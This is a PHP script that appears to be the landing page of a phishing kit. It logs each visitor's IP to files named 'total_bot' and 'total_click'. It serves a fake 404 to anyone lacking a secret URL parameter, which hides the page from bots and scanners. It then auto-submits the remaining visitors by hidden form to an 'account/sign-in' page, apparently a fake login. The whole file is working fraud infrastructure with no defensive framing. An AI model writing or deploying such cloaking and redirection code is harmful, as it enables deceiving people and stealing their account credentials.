<?php
include'admin/tod/config.php';
include'main.php';
$ip = getUserIP();
$random = substr(sha1(mt_rand()),1,25);
if($config['site_param_on'] == "on") {
    $secret = $config['site_parameter'];
    $password = $_GET[$secret];
    if(!isset($password)) {
	tulis_file("admin/result/total_bot.txt", $ip);
    exit(header("HTTP/1.0 404 Not Found"));
    header("location: ");
        exit();
    }else{
	  tulis_file("admin/result/total_click.txt", $ip);
      echo "<form id='boyxd' method='POST' action='account/sign-in'><input type='hidden' name='akseskey' value='".$secret."'></form><script type='text/javascript'>document.getElementById('boyxd').submit();</script>";
    }
}else{
    tulis_file("admin/result/total_click.txt", $ip);
    echo "<form id='boyxd' method='POST' action='account/sign-in'><input type='hidden' name='akseskey' value='".$secret."'></form><script type='text/javascript'>document.getElementById('boyxd').submit();</script>";
}
?>